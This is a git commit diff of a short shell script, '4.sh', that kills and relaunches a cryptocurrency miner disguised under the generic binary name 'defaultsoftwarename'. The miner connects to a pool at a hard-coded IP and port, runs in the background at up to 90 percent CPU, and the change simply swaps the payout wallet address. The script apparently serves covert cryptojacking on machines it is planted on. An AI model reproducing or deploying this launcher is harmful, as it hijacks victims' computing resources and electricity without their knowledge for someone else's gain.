156277c68a386ff30e7f48e68d0259411b87ea5e
googlo43 <67450138+googlo43@users.noreply.github.com>
2020-07-07 09:19:01 +0300

    Update 4.sh

--- 4.sh
+++ 4.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o 194.87.96.23:33761 -u 88PeDs2PnkAAMmZnZo8WbpKAvpAJ3rfDLW8UTA6t7jUXetfYJytw9dYi6gZrajp7DSbJLuXgUPuTcVRrYuDbRsruL1UqiGh --pass=x:reskomore@yandex.com --rig-id=06 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=90 --av=1
+defaultsoftwarename -o 194.87.96.23:33761 -u 42fe2Z9mTk6MX2pap97qF25vi4G6yQwaoZxGQuLZi7pDCq9XUwWdwsUSCDaWCoeSW4YaJd4HYo15RFFJBCY9pptdLkEb89B --pass=x:reskomore@yandex.com --rig-id=06 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=90 --av=1
